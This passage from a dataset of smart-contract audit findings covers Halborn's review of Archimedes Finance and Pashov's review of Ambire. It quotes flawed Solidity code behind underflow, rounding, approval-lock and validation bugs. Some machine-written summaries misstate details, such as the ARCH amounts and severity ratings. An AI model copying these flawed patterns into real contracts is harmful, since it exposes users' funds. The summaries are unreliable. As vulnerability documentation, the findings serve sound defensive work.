      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50597",
      "title": "CONTRACT DEPENDENCIES CANNOT BE MODIFIED",
      "impact": "HIGH",
      "content": "##### Description\n\nEvery main contract has a `setDependencies()` function, which is used to set the key contracts needed for the proper functioning of the entire ecosystem, such as tokens, pools, or other contract addresses, or modify them after the deployment if needed for operational purposes.\n\nIn addition to that, `Coordinator.sol` and `PoolManager.sol` contracts include `safeApprove()` and `approve()` calls, respectively.\n\nDue to these calls and the implementation of `safeApprove()` and `3CRV` token's `approve()` function, which prevents new `safeApprove()` or `approve()` calls if the current allowance is greater than zero, `setDependencies()` could remain blocked, preventing contract administrators to modify these values if needed.\n\nCode Location\n-------------\n\n#### PoolManager.sol\n\n```\n    function setDependencies(\n        address addressParameterStore,\n        address addressCoordinator,\n        address addressLvUSD,\n        address address3CRV,\n        address addressPoolLvUSD3CRV\n    ) external nonReentrant onlyAdmin {\n        // Set variables\n        _addressParameterStore = addressParameterStore;\n        _addressCoordinator = addressCoordinator;\n        _addressPoolLvUSD3CRV = addressPoolLvUSD3CRV;\n\n        // Load contracts\n        _paramStore = ParameterStore(addressParameterStore);\n        _lvusd = IERC20Upgradeable(addressLvUSD);\n        _crv3 = IERC20Upgradeable(address3CRV);\n        _poolLvUSD3CRV = ICurveFiCurve(addressPoolLvUSD3CRV);\n\n        _lvusd.approve(_addressPoolLvUSD3CRV, type(uint256).max);\n        _crv3.approve(_addressPoolLvUSD3CRV, type(uint256).max);\n    }\n\n```\n\n`PoolManager.sol` calls `3CRV.approve()` each time `setDependencies()` is called. Since `3CRV`'s implementation of `approve()` does not allow new approvals when there is already an existing one, every `setDependencies()` call after the first one will be reverted.\n\nCalling `setDependencies()` more than once on `PoolManager.sol` and `Coordinator.sol` contracts will easily disclose the problem:\n\n![approveFail1.png](https://halbornmainframe.com/proxy/audits/images/659e93dea1aa3698c0ea95ff)\n![approveFail2.png](https://halbornmainframe.com/proxy/audits/images/659e93dea1aa3698c0ea9602)\n\n##### Score\n\nImpact: 5  \nLikelihood: 3",
      "summary": "\nThe bug report describes an issue with the `setDependencies()` function in certain contracts. This function is used to set important contracts needed for the proper functioning of the system. However, due to some calls and implementations in other contracts, the `setDependencies()` function can become blocked, preventing administrators from modifying these values if needed. This can cause problems for the system and is rated as having a medium impact and a moderate likelihood of occurring.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50596",
      "title": "INCORRECT CALCULATEARCHNEEDEDFORLEVERAGE CALCULATION",
      "impact": "HIGH",
      "content": "##### Description\n\nThe `calculateArchNeededForLeverage()` function is defined within the `ParameterStore.sol` contract, and its intended use is to calculate how much `ARCH` needs to be sent along with the initial amount of `OUSD` to open the position.\n\nHowever, it has been detected that the calculation is performed incorrectly due to the order of the operations performed.\n\nThis is how the `ARCH` amount is calculated:\n\n\\begin{center} \\begin{math} (leverageAmount / \\_archToLevRatio) \\* 1 ether \\end{math} \\end{center}\n\nSince the division is performed before the multiplication, the result of the division will be rounded down to the closest integer, having that if the real amount of `ARCH` needed is `58.751`, the result of the calculation will be `58`.\n\nIf this function is used in the frontend or is manually called by any user, will either prevent users from opening any position using the right amount of ARCH needed (or having to calculate it using less intuitive methods) or force them to send more ARCH than needed to open the position.\n\nIn addition to this, and if `calculateArchNeededForLeverage()` is used in `createLeveragedPosition()` logic in the future, this behavior may allow users opening positions without having to pay any `ARCH` if the result of the division is lower than 1.\n\nThis finding would usually be classified as `Medium`, but, since extra `ARCH` tokens are not returned as described in `HAL-04`, the impact of this finding has been raised.\n\nCode Location\n-------------\n\n#### ParameterStore.sol\n\n```\n    function calculateArchNeededForLeverage(uint256 leverageAmount) public view returns (uint256) {\n        return (leverageAmount / _archToLevRatio) * 1 ether;\n    }\n\n```\n\nA new position will be opened by `user1`, depositing `10 OUSD` for 10 cycles. The amount of `ARCH` needed for opening the position, according to the output of `calculateArchNeededForLeverage` is `58`, which is the amount the user will be supplied. Since the calculation has been rounded down, it will not create the position, since not enough `ARCH` has been provided. If supplying `100 ARCH` instead, the position will be created successfully.\n\n![archCalculation.png](https://halbornmainframe.com/proxy/audits/images/659e93d6a1aa3698c0ea95e4)\n\n##### Score\n\nImpact: 5  \nLikelihood: 3",
      "summary": "\nThe `calculateArchNeededForLeverage()` function in the `ParameterStore.sol` contract is used to calculate the amount of `ARCH` tokens needed to open a position with `OUSD` tokens. However, it has been found that the calculation is incorrect due to the order of operations. This means that the calculated `ARCH` amount may be rounded down, resulting in users not being able to open positions with the correct amount of `ARCH` or having to send more `ARCH` than necessary. This bug may also allow users to open positions without paying any `ARCH` if the result of the calculation is less than 1. The impact of this bug has been raised due to the fact that extra `ARCH` tokens are not returned as described in `HAL-04`. To reproduce this bug, a user can try to open a position with `10 OUSD` for 10 cycles, which should require `58 ARCH` according to the `calculateArchNeededForLeverage()` function. However, the rounded down calculation will only supply `58` `ARCH`, which is not enough to open the position. To successfully open the position, the user will need to supply `100 ARCH` instead. The impact of this bug is rated as 5 out of 10 and the likelihood is rated as 3 out of 10.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50595",
      "title": "ZERO LEVERAGE POSITIONS CAN BE OPENED",
      "impact": "MEDIUM",
      "content": "##### Description\n\nIt has been detected that positions with 0 leverage cycles can be opened. Although these kinds of positions make no sense in the context of these contracts, they still can be opened (i.e., because of user input error).\n\nOpening a position like this will have the following consequences:\n\n* Any ARCH sent with the position will be burned and lost forever (as described in the `UNUSED ARCH NOT RETURNED WHEN OPENING A POSITION` finding).\n* No fees will be collected since opening fees are calculated from the leverage obtained, which will be zero in this scenario.\n* If a `USD` rebase takes place after opening the position, the position will remain locked forever. This is caused by the behavior described in the `OUSDTOTAL VARIABLE SHOULD BE REMOVED` finding. When trying to withdraw any `OUSD` under the position, `oUSDTotal` will remain the same amount as the initial `OUSD` sent as principal, and `oUSDAmountToWithdraw` will be greater because of the rebase, causing the following required statement never to be fulfilled:\n\n#### CDPosition.sol\n\n```\n    function withdrawOUSDFromPosition(uint256 nftID, uint256 oUSDAmountToWithdraw) external nftIDMustExist(nftID) nonReentrant onlyExecutive {\n        require(_nftCDP[nftID].oUSDTotal >= oUSDAmountToWithdraw, \"Insufficient OUSD balance\");\n        _nftCDP[nftID].oUSDTotal -= oUSDAmountToWithdraw;\n    }\n\n```\n\n##### Score\n\nImpact: 5  \nLikelihood: 1",
      "summary": "\nThis bug report mentions that positions with 0 leverage cycles can be opened, even though they do not make sense in the context of the contracts. This can happen due to user input error. Opening a position with 0 leverage cycles can result in the following consequences: \n- Any ARCH sent with the position will be burned and lost forever. \n- No fees will be collected since opening fees are calculated based on the leverage obtained, which is zero in this case. \n- If a `USD` rebase occurs after opening the position, the position will remain locked forever. This is due to a behavior described in the report. \nAdditionally, trying to withdraw any `OUSD` under the position will not be possible, as the required statement will never be fulfilled. The impact of this bug is rated as 5 out of 10, and the likelihood of it occurring is rated as 1 out of 10. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50594",
      "title": "INCONSISTENT PARAMETER FORMATTING",
      "impact": "LOW",
      "content": "##### Description\n\n`ParameterStore.sol` contract stores global parameters that are used when managing positions, such as `_maxNumberOfCycles`, `_originationFeeRate`, etc.\n\nHowever, it has been detected that parameters with a similar format or that are used in similar ways (like percentages, for example) are defined and used differently, which could cause contract unexpected behavior (or even worse situations such as fund loss) if they are mistakenly modified.\n\nCode Location\n-------------\n\n#### ParameterStore.sol\n\n```\n        _maxNumberOfCycles = 10;\n        _originationFeeRate = 5 ether / 100;\n        _globalCollateralRate = 90;\n        _rebaseFeeRate = 10 ether / 100; // meaning 10%\n        _treasuryAddress;\n        _curveGuardPercentage = 90;\n        _slippage = 2; // 2%;\n        _archToLevRatio = 1 ether; // meaning 1 arch is equal 1 lvUSD\n        _curveMaxExchangeGuard = 50; // meaning we allow exchange with get 50% more then we expected\n        _treasuryAddress = address(0);\n\n```\n\nIn this example can be seen how two different rates (with `90%` and `10%` values, respectively) are calculated differently.\n\n##### Score\n\nImpact: 3  \nLikelihood: 1",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50593",
      "title": "OUSDTOTAL VARIABLE SHOULD BE REMOVED",
      "impact": "LOW",
      "content": "##### Description\n\nStruct CDP is defined within `CDPosition.sol` contract. It contains information about positions, such as the initial `LvUSD` amount borrowed, the `OUSD` shares held by the position, etc.\n\nHowever, it has been detected that `oUSDTotal` is declared, used, and never updated, which could cause unpredictable behavior or even render positions unwindable.\n\nAccording to the comments in the code, this variable holds the total `OUSD` amount held by the position, including the initial `OUSD` amount staked (principle), the leverage obtained, and the profits obtained by interest or rebases. This information could also be retrieved using `CDP.shares`.\n\nHowever, this variable is never updated, so the `oUSDTotal` value will be stuck forever with the principle + leverage `OUSD` amount. Also, this variable is incorrectly used in a require statement to assert that no more `OUSD` than the available is used:\n\n#### CDPosition.sol\n\n```\n    function withdrawOUSDFromPosition(uint256 nftID, uint256 oUSDAmountToWithdraw) external nftIDMustExist(nftID) nonReentrant onlyExecutive {\n        require(_nftCDP[nftID].oUSDTotal >= oUSDAmountToWithdraw, \"Insufficient OUSD balance\");\n        _nftCDP[nftID].oUSDTotal -= oUSDAmountToWithdraw;\n    }\n\n```\n\nWhen following the function logic flow, it has been detected that `oUSDTotal` is compared to `oUSDAmountToWithdraw`, that is, the `OUSD` amount remaining under the position after swapping `OUSD` for `LvUSD` to repay the leverage obtained. After the comparison, `oUSDAmountToWithdraw` is subtracted from `oUSDTotal`, leaving its value inconsistent.\n\nCode Location\n-------------\n\n#### CDPosition.sol\n\n```\n    struct CDP {\n        uint256 oUSDPrinciple; // Amount of OUSD originally deposited by user\n        uint256 oUSDInterestEarned; // Total interest earned (and rebased) so far\n        uint256 oUSDTotal; // Principle + OUSD acquired from selling borrowed lvUSD + Interest earned\n        uint256 lvUSDBorrowed; // Total lvUSD borrowed under this position\n        uint256 shares; // Total vault shares allocated to this position\n    }\n\n```\n\n##### Score\n\nImpact: 3  \nLikelihood: 1",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50592",
      "title": "UNUSED ARCH NOT RETURNED WHEN OPENING A POSITION",
      "impact": "HIGH",
      "content": "##### Description\n\nOpening a position requires the following user input:\n\n* Amount of `OUSD` that will be used as collateral\n* Number of leverage cycles\n* The required amount of `ARCH` to burn for the position\n\nWhen calling `createLeveragedPosition()` from `LeverageEngine.sol` contract, the first instruction calculates the corresponding `LvUSD` to be unlocked with the provided collateral and leverage cycles. The second one checks the maximum amount of `LvUSD` that could be claimed with the `ARCH` amount supplied, reverting if the result of the second instruction is lower than the first one.\n\nThis effectively checks if the user provided at least the minimum amount of `ARCH` required for opening the position, but it does not check if the user provided more `ARCH` than is actually needed.\n\nThe next instruction just sends the `ARCH` amount provided by the user to the treasury account, effectively taking all of the `ARCH` provided.\n\nCode Location\n-------------\n\n#### LeverageEngine.sol\n\n```\nfunction createLeveragedPosition(\n        uint256 ousdPrinciple,\n        uint256 cycles,\n        uint256 archAmount\n    ) external nonReentrant returns (uint256) {\n        uint256 lvUSDAmount = _parameterStore.getAllowedLeverageForPosition(ousdPrinciple, cycles);\n        uint256 lvUSDAmountAllocatedFromArch = _parameterStore.calculateLeverageAllowedForArch(archAmount);\n        /// Revert if not enough Arch token for needed leverage. Continue if too much arch is given\n        require(lvUSDAmountAllocatedFromArch >= lvUSDAmount, \"Not enough Arch provided\");\n\n        uint256 availableLev = _coordinator.getAvailableLeverage();\n        require(availableLev >= lvUSDAmount, \"Not enough available lvUSD\");\n\n        _burnArchTokenForPosition(msg.sender, archAmount);\n        uint256 positionTokenId = _positionToken.safeMint(msg.sender);\n        _ousd.safeTransferFrom(msg.sender, _addressCoordinator, ousdPrinciple);\n        _coordinator.depositCollateralUnderNFT(positionTokenId, ousdPrinciple);\n        _coordinator.getLeveragedOUSD(positionTokenId, lvUSDAmount);\n\n        emit PositionCreated(msg.sender, positionTokenId, ousdPrinciple, lvUSDAmount, archAmount);\n        return positionTokenId;\n    }\n\n```\n\nA new position has been opened by `user1`, depositing `10 OUSD` for 10 cycles. The amount of `ARCH` needed for opening the position is `58`, but the user supplies `1000`, just to be sure.\n\n![extraArch.png](https://halbornmainframe.com/proxy/audits/images/659e93d4a1aa3698c0ea95de)\n\n##### Score\n\nImpact: 5  \nLikelihood: 4",
      "summary": "\nThis bug report is about a problem in a code that allows users to open leveraged positions. The code requires users to input three things: the amount of `OUSD` they want to use as collateral, the number of leverage cycles, and the required amount of `ARCH` tokens to burn for the position. However, there is an issue with the code that checks if the user has provided enough `ARCH` tokens to open the position. While it checks if the user has provided at least the minimum amount of `ARCH` required, it does not check if the user has provided more `ARCH` than is actually needed. This means that users can accidentally provide too many `ARCH` tokens, which will all be taken by the code. This bug has a high impact and a medium likelihood of occurring.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50591",
      "title": "CONTRACT DENIAL OF SERVICE DUE TO INTEGER UNDERFLOW",
      "impact": "HIGH",
      "content": "##### Description\n\nWhen any user calls `createLeveragedPosition()` from `LeverageEngine` contract, `depositCollateralUnderNFT()` is called, and this function also calls `archimedesDeposit()` from the OUSD Vault, in order to actually deposit the `OUSD` provided by the user in the vault and issue the corresponding vault shares.\n\nOne of the instructions executed when calling `archimedesDeposit()` is to call `_takeRebaseFees()`, which compares the current `OUSD` balance of the pool (by calling `OUSD.balanceOf()`) with the last known amount of `OUSD` held in the vault (stored in `_assetsHandledByArchimedes`) to look for any possible `OUSD` rebase, which would have increased vault's `OUSD` balance.\n\nHowever, it has been detected that due to the behavior of `OUSD` when querying for balances described in the previous finding, `_assetsHandledByArchimedes` could be greater than totalAssets(), causing an integer underflow every time `_takeRebaseFees()` gets called, and effectively blocking the contracts (since no position could be opened or unwound in this state) until `OUSD` gets rebased (making `totalAssets()` greater or equal than `_assetsHandledByArchimedes`).\n\nCode Location\n-------------\n\n#### VaultOUSD.sol\n\n```\n    function _takeRebaseFees() internal {\n        uint256 unhandledRebasePayment = totalAssets() - _assetsHandledByArchimedes;\n        /// only run fee collection if there are some rebased funds not handled\n        if (unhandledRebasePayment > 0) {\n            uint256 feeToCollect = (unhandledRebasePayment * _paramStore.getRebaseFeeRate()) / 1 ether;\n            uint256 handledRebaseValueToKeepInVault = unhandledRebasePayment - feeToCollect;\n\n            _assetsHandledByArchimedes += handledRebaseValueToKeepInVault;\n\n            _ousd.transfer(_paramStore.getTreasuryAddress(), feeToCollect);\n        }\n    }\n\n```\n\nIn order to improve variable visibility, `_assetsHandledByArchimedes` has been declared as `public` instead of `internal`.\n\nFor this proof of concept, a user will try to open two consecutive positions, and values used in `_takeRebaseFees` will be analyzed:\n\n![contractDos.png](https://halbornmainframe.com/proxy/audits/images/659e93d7a1aa3698c0ea95e7)\n\n##### Score\n\nImpact: 5  \nLikelihood: 5",
      "summary": "\nThe bug report describes an issue where a function in the LeverageEngine contract is causing an integer underflow due to the behavior of the OUSD token. This results in the contracts being blocked until the OUSD token is rebased. The code location and a proof of concept are provided for further analysis. This bug has a high impact and likelihood of occurring.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50590",
      "title": "POSITIONS CANNOT BE UNWOUND ALTHOUGH ENOUGH OUSD IS HELD",
      "impact": "HIGH",
      "content": "##### Description\n\nOnce any user tries to unwind a position, one of the multiple steps performed is to redeem every `OUSD` available in the vault under that position and:\n\n1. Check the `LVUSD` amount that was initially borrowed and has to be repaid in order to close the position.\n2. Calculate the needed amount of `OUSD` that will have to be exchanged for the amount of `LvOUSD` obtained in the previous step (plus an extra `1%` for slippage protection).\n3. Check that the needed amount of `OUSD` is not greater than the `OUSD` available. Otherwise, the user will not be able to close the position since he cannot repay the `LvOUSD` initially borrowed.\n\nThen, this minimum required amount of `OUSD` calculated is swapped for `LvOUSD`, and the output is then compared again with the initially borrowed `LvOUSD`.\n\nIf the amount of swapped `LvOUSD` is enough to repay the initially borrowed `LvOUSD`, it will be transferred back to the `Coordinator`, and the remaining `OUSD` amount will be transferred to the user as collateral reimbursement (and profits, if any).\n\nHowever, if the calculated amount of needed `OUSD` does not finally get as many `LvUSD` as calculated (due to slippage, imbalanced pool, etc.), the transaction will be reverted with `Not enough LvUSD in pool` error, remaining unwindable until the `OUSD` amount calculated for swapping actually gets enough `LvUSD` back, although more than enough `OUSD` for closing the position is held.\n\nThis behavior goes against what is described in [Archimedes Documentation](https://docs.archimedesfi.com/taking-leverage#96c294e8b8b445e091a319cd279a63c3), which states that any user holding enough `OUSD` to pay for the debt should be able to close the position:\n\n![](img/archDocs.png)\n\nIt also has been detected that `_neededOUSDWithSlippage` is not being accurately calculated since it assumes that the estimated amount calculated using `get_dy` functions will remain constant in both directions of the swap (`LvUSD` -> `3CRV` -> `OUSD` and `OUSD` -> `3CRV` -> `LvUSD`), and only a `1%` slippage protection has been hardcoded (which would have to absorb swap miscalculations, actual slippage, etc.), which might be not enough and introduces an artificial position unwind limit of ~`2.3%`, meaning that any position borrowing a `LvUSD` amount greater than `2.3%` of the total pool balance (`LvUSD` + `3CRV` balances) will become unwindable.\n\nCode Location\n-------------\n\n#### Exchanger.sol\n\n```\n       function _swapOUSDforLvUSD(uint256 amountOUSD, uint256 minRequiredLvUSD) internal returns (uint256 lvUSDReturned, uint256 remainingOUSD) {\n        // Estimate \"neededOUSD\" using get_dy()\n        uint256 _needed3CRV = _poolLvUSD3CRV.get_dy(_indexLvUSD, _index3CRV, minRequiredLvUSD);\n        uint256 _neededOUSD = _poolOUSD3CRV.get_dy(_index3CRV, _indexOUSD, _needed3CRV);\n        uint256 _neededOUSDWithSlippage = (_neededOUSD * 101) / 100;\n\n        require(amountOUSD >= _neededOUSDWithSlippage, \"Not enough OUSD for exchange\");\n\n        // We lose some $ from fees and slippage\n        // multiply _neededOUSD * 103%\n        uint256 _returned3CRV = _xOUSDfor3CRV(_neededOUSDWithSlippage);\n\n        uint256 _returnedLvUSD = _x3CRVforLvUSD(_returned3CRV);\n        require(_returnedLvUSD >= minRequiredLvUSD, \"Not enough LvUSD in pool\");\n\n        // calculate remaining OUSD\n        remainingOUSD = amountOUSD - _neededOUSDWithSlippage;\n        _ousd.safeTransfer(_addressCoordinator, remainingOUSD);\n\n        // send all swapped lvUSD to coordinator\n        _lvusd.safeTransfer(_addressCoordinator, _returnedLvUSD);\n\n        return (_returnedLvUSD, remainingOUSD);\n    }\n\n```\n\nA new position has been opened by `user1`, depositing `10 OUSD` for 10 cycles. When trying to unwind the position, the transaction will get reverted with a `Not enough LvUSD in pool` error. After that, calltrace will be shown in order to inspect the relevant values involved (only relevant values will be displayed):\n\n![closePoc1.png](https://halbornmainframe.com/proxy/audits/images/659e93d9a1aa3698c0ea95ed)\n![closePoc2.png](https://halbornmainframe.com/proxy/audits/images/659e93daa1aa3698c0ea95f0)\n\nThis is the call performed to `Exchanger.swapOUSDforLvUSD`. The total amount of `OUSD` held in the position is `65.44831518184307 OUSD`, and the minimum amount of `LvUSD` to repay is `58.618940391 LvUSD`:\n\n![closePoc3.png](https://halbornmainframe.com/proxy/audits/images/659e93daa1aa3698c0ea95f3)\n\nAnd the amount of `LvUSD` received by the calculated amount of `OUSD` is `58.4852340246938 LvUSD`, which is lower than the minimum amount needed:\n\n![closePoc4.png](https://halbornmainframe.com/proxy/audits/images/659e93dba1aa3698c0ea95f6)\n\nThe user has indeed enough `OUSD` to close the position, but not enough are taken.\n\nTo ilustrate the `_neededOUSDWithSlippage` miscalculation, a few swap estimations have been performed using the contract's implemented logic. The initial condition is a balanced `LvUSD/3CRV` pool with `100_000 LvUSD` and `100_000 3CRV` (assuming no slippage):\n\n![calc1.png](https://halbornmainframe.com/proxy/audits/images/659e93dca1aa3698c0ea95f9)\n\nAn alternative method to estimate the `OUSD` amount to be swapped can be used, preventing transactions from reverting and actually allowing users to unwind their positions:\n\n![calc2.png](https://halbornmainframe.com/proxy/audits/images/659e93dda1aa3698c0ea95fc)\n\n##### Score\n\nImpact: 5  \nLikelihood: 5",
      "summary": "\nThe bug report describes an issue where users are unable to close their positions in the Archimedes protocol. This is due to a miscalculation in the amount of OUSD needed for the swap, which results in the transaction being reverted with a \"Not enough LvUSD in pool\" error. This goes against what is stated in the Archimedes documentation and limits the ability for users to unwind their positions. The report also highlights a potential issue with the hardcoded slippage protection, which could result in an artificial limit on the amount of OUSD that can be swapped. The impact of this bug is high, as it prevents users from closing their positions and could potentially lead to loss of funds. The likelihood of this bug occurring is also high. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50589",
      "title": "POSITIONS CANNOT BE UNWOUND DUE TO OUSD BEHAVIOR",
      "impact": "HIGH",
      "content": "##### Description\n\nIt has been observed that once a user tries to unwind any position (supplying the `positionTokenID` of any owned NFT), multiple operations are performed, so the user can retrieve the `OUSD` initially sent.\nOnce the final `OUSD` amount is transferred to the user, a require statement is placed to check that the correct amount of `OUSD` has been transferred to the user.\n\nHowever, due to `OUSD` behavior when transferring and querying for token balances, this requirement statement could not get fulfilled when transferring non-rounded amounts, causing the transaction to revert and positions to become unwindable.\n\n#### Coordinator.sol\n\n```\n    function _withdrawCollateralUnderNFT(\n        uint256 _nftId,\n        uint256 _amount,\n        address _to\n    ) internal {\n        /// Method makes sure ousd recorded balance transfer\n        // TODO: Do we really need this check? Seems excessive\n        uint256 userOusdBalanceBeforeWithdraw = _ousd.balanceOf(_to);\n        _ousd.safeTransfer(_to, _amount);\n        require(_ousd.balanceOf(_to) == userOusdBalanceBeforeWithdraw + _amount, \"OUSD transfer balance incorrect\");\n        _cdp.withdrawOUSDFromPosition(_nftId, _amount);\n    }\n\n```\n\nThis behavior could also create inaccuracies when handling vault rebases or in any situation where checking the balance of an account is needed.\n\nA new position has been opened by `user1`, depositing `10 OUSD` for 10 cycles. When trying to unwind the position, the transaction gets reverted with the following error:\n\n![errorUnwinding1.png](https://halbornmainframe.com/proxy/audits/images/659e93cda1aa3698c0ea95c9)\n\nChecking the call traces of the transaction, the `OUSD` balance of user1 before unwinding the position is `990000000000000000000`, equivalent to `990 OUSD`:\n\n![user1BalBefore.png](https://halbornmainframe.com/proxy/audits/images/659e93cea1aa3698c0ea95cc)\n\nThe amount of `OUSD` to be transferred back to user1 is `7122076543972609693`, ~`7.12 OUSD`:\n\n![transferAmount.png](https://halbornmainframe.com/proxy/audits/images/659e93cfa1aa3698c0ea95cf)\n\nAfter the transfer is performed, the balance of user1 is checked again for the require statement:\n\n![user1BalAfter.png](https://halbornmainframe.com/proxy/audits/images/659e93d0a1aa3698c0ea95d2)\n\nDue to `OUSD` behavior, the requirement statement does not get fulfilled, reverting the transaction since 990000000000000000000 + 7122076543972609693 = 997122076543972609693, and user1's balance is 997122076543972609692.\n\nThis behavior can be easily observed just by transferring some tokens to any user and checking the balance immediately after:\n\n![ousdTransfer.png](https://halbornmainframe.com/proxy/audits/images/659e93d1a1aa3698c0ea95d5)\n\n##### Score\n\nImpact: 5  \nLikelihood: 5",
      "summary": "\nThe report describes a bug where a user is unable to retrieve their initial OUSD amount when trying to unwind a position. This is due to a requirement statement that cannot be fulfilled because of the behavior of OUSD when transferring and querying for token balances. This can cause inaccuracies in handling vault rebases and other situations where checking an account's balance is necessary. The bug has a high impact and likelihood of occurring.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "31398",
      "title": "[L-02] No `withdrawTo` functionality in `AmbirePaymaster`",
      "impact": "LOW",
      "content": "The ERC4337 implementation on Ethereum has a `StakeMaster` contract with a `withdrawTo` functionality, allowing a paymaster to withdraw his deposit as seen [here](https://github.com/eth-infinitism/account-abstraction/blob/674b1f51164e641a18d5c141895bab9c96a68e9d/contracts/core/StakeManager.sol#L137-L148). The issue is that `AmbirePaymaster` doesn't implement a direct way to call this functionality but it does, however, have the arbitrary call functionality allowed for the `relayer` address. Through that functionality the `withdrawTo` method can be called, but the `call` method has the following comment in its NatSpec:\n\n```solidity\n* @notice  This method can be used to withdraw stuck tokens or airdrops\n```\n\nwhich means it wasn't expected to do so. If you plan on using `call` for other things as well, consider making it `payable` since it uses a `value` argument but the contract doesn't have a way to receive ETH.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Ambire",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov/2023-11-01-Ambire.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov"
      ]
    },
    {
      "id": "31397",
      "title": "[L-01] The DKIM logic to verify headers allows weird cases",
      "impact": "LOW",
      "content": "The `_verifyHeaders` method in `DKIMRecoverySigValidator` now allows for the following two anomalies:\n\n1. A valid set of headers that have extra text in between them, which is in between two `\\r\\n` expressions\n2. Reordered `subject`, `to` and `from` headers are now allowed - previously the order - `from`, `to`, `subject` was expected\n\nYou can change the code to be a sequential state machine, basically enforcing an order of text in headers.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Ambire",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov/2023-11-01-Ambire.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov"
      ]
    },
    {
      "id": "34026",
      "title": "[L-02] Validate the `to` email as you do for the `from` one",
      "impact": "LOW",
      "content": "In `DKIMRecoverySigValidator::_verifyHeaders` the `from` mail is validated in a way that protects from the email that looks like \"fake@gmail.com@gmail.com\". The check is not done for the `to` mail and can be added by slicing the string up until the special character that is expected to be after the email, and comparing this to `toHeader`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Ambire",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2023-09-01-Ambire.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov"
      ]
    },
    {
      "id": "34025",
      "title": "[L-01] The `dateRemoved` field of a removed DKIM key can be reset",
      "impact": "LOW",
      "content": "The `removeDKIMKey` method in `DKIMRecoverySigValidator` does not check if the given key has already been removed. The `authorizedToRevoke` account can call the method for the same key as many times as he wants, which will reset the `dateRemoved` property to `block.timestamp` each time.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Ambire",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2023-09-01-Ambire.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov"
      ]
    },
    {
      "id": "34024",
      "title": "[M-01] Insufficient input validation",
      "impact": "MEDIUM",
      "content": "**Severity**\n\n**Impact:**\nHigh, as it can result in forever blocked recoveries or wallet access loss\n\n**Likelihood:**\nLow, as it requires user error when configuring their recovery\n\n**Description**\n\nThe `DKIMRecoverySigValidator` contract uses the `AccInfo` struct that has fields which values are not validated. Here are the fields that are problematic:\n\n- `secondaryKey` can be the zero address, which can result in a loss of access to the `AmbireAccount` wallet\n- `waitUntilAcceptAdded` is a time value and can be too big, resulting in inability to add DKIM keys\n- `waitUntilAcceptRemoved` is a time value and can be too big, resulting in inability to remove DKIM keys\n- `onlyOneSigTimelock` is a time value and can be too big, resulting in forever locked recovery\n\n**Recommendations**\n\nAdd sensible upper boundaries for the time values and a check that `secondaryKey != address(0)`.",
